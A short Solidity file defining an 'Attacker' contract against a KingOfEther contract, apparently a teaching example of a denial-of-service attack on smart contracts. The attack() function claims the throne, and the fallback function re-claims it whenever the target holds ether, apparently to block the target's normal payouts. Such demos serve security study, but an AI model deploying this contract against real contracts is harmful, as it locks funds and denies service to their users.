// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./DOS.sol";

contract Attacker {
    KingOfEther public kingOfEther;

    constructor(address _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    fallback() external payable {
        if (address(kingOfEther).balance > 0) {
            kingOfEther.claimThrone{value: address(this).balance}();
        }
    }

    function attack() public payable {
        require(msg.value > 0, "Send some Ether to attack");
        kingOfEther.claimThrone{value: msg.value}();
    }
}